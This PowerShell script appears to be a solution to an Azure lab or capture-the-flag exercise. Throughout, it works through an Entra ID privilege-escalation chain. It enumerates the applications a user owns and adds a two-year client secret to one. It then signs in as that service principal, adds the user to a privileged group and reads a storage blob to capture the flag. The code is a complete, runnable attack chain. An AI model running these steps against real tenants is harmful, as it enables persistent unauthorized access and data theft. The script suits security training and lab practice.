$tenantId = "f9a23d97-279e-48b8-b3fa-a0222acbdd9f"
#=================Connect-User-1=====================#
# Your existing script
$tenantId = "f9a23d97-279e-48b8-b3fa-a0222acbdd9f"
$userName_1 = "<userName>"
$pass_1 = "" | ConvertTo-SecureString -AsPlainText -Force
$cred_1 = New-Object System.Management.Automation.PSCredential($userName_1, $pass_1)

# Connect as User 1
Connect-AzAccount -Credential $cred_1 -Tenant $tenantId

#=================Recon-Object-Owner=================#
$user_1_ObjectID = (Get-AzContext).Account.ExtendedProperties.HomeAccountId.Split('.')[0]
$token = (Get-AzAccessToken -Resource "https://graph.microsoft.com").Token | ConvertFrom-SecureString -AsPlainText 
$URI = "https://graph.microsoft.com/v1.0/users/$user_1_ObjectID/ownedObjects"
$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{
        'Authorization' = "Bearer $token"
    }
}
$res = (Invoke-RestMethod @RequestParams).value
$App_1_ObjectId = $res.id[1]

#=================Create-New-Secret=================#
$SecretDisplayName = "TestSecret"
$ExpirationDate = (Get-Date).AddYears(2)
$apiUrl = "https://graph.microsoft.com/v1.0/applications/$App_1_ObjectId/addPassword"
$body = @{
    passwordCredential = @{
        displayName = $SecretDisplayName
        endDateTime = $ExpirationDate.ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
    }
} | ConvertTo-Json
$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type"  = "application/json"
}
$response = Invoke-RestMethod -Method Post -Uri $apiUrl -Headers $headers -Body $body
sleep(5)
Disconnect-AzAccount
#=================Connect-To-ServicePricipal-App1=================#

$appId = $res.appId[1]
$appPass = $response.secretText | ConvertTo-SecureString -AsPlainText -Force
$creds_App_1 = new-object System.Management.Automation.PSCredential($appId, $appPass)
Connect-AzAccount -ServicePrincipal -Credential $creds_App_1 -Tenant $tenantId
$subscription = (Get-AzSubscription).Id
$ResourceGroupName = (Get-AzResourceGroup).ResourceGroupName
$token = (Get-AzAccessToken -Resource "https://graph.microsoft.com").Token | ConvertFrom-SecureString -AsPlainText 

$sp_obj = (Get-AzADServicePrincipal -ApplicationId $appId).Id

#See the permission the servicePricipal have
Get-AzRoleAssignment -ObjectId $sp_obj
#=================ListGroups=================#

# Get access token for Microsoft Graph
$token = (Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com").Token | ConvertFrom-SecureString -AsPlainText

# Prepare common headers
$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type"  = "application/json"
}

$uri = "https://graph.microsoft.com/v1.0/groups"

$response = Invoke-RestMethod -Method Get -Uri $uri -Headers $headers

$groupId = ($response.value | Select-Object id, displayName | Where-Object { $_.displayName -like "*eliLab1*" }).id
#=================AddUserToGroup=================#

$addUserUri = "https://graph.microsoft.com/v1.0/groups/$groupId/members/`$ref"

$body = @{
    "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$user_1_ObjectID"
} | ConvertTo-Json

try {
    Invoke-RestMethod -Method Post -Uri $addUserUri -Headers $headers -Body $body
    Write-Host "User added to eliLab1Group successfully!" -ForegroundColor Green
}
catch {
    Write-Warning "Failed to add user to group (might already be a member): $_"
}

# Wait a moment for group membership to propagate
Write-Host "Waiting for group membership to propagate..." -ForegroundColor Cyan
Start-Sleep -Seconds 5




#=================User2-StorageAccounts-ReadBlob-Flag=================#
Disconnect-AzAccount
$tenantId = "f9a23d97-279e-48b8-b3fa-a0222acbdd9f"
$userName_1 = ""
$pass_1 = "" | ConvertTo-SecureString -AsPlainText -Force
$cred_1 = New-Object System.Management.Automation.PSCredential($userName_1, $pass_1)
# Connect as User 1
Connect-AzAccount -Credential $cred_1 -Tenant $tenantId
Get-AzRoleAssignment # show all the permission
Get-AzResource #show the stroageAccount

# Get storage account properly
$storageAccounts = Get-AzStorageAccount
if ($storageAccounts.Count -gt 0) {
    $storageAccountObj = $storageAccounts[0]
    $SA_resourceGroup = $storageAccountObj.ResourceGroupName
    $SA_storageName = $storageAccountObj.StorageAccountName
}
else {
    Write-Error "No storage accounts found"
    exit
}

Write-Host "Storage Account: $SA_storageName" -ForegroundColor Green
Write-Host "Resource Group: $SA_resourceGroup" -ForegroundColor Green

$session = New-AzStorageContext -StorageAccountName $SA_storageName
$SA_containerName = (Get-AzStorageContainer -Context $session).Name

$blob = Get-AzStorageBlob -Container $SA_containerName -Context $session
$flag = $blob.ICloudBlob.DownloadText()
Write-Host "The Final Flag: $flag"
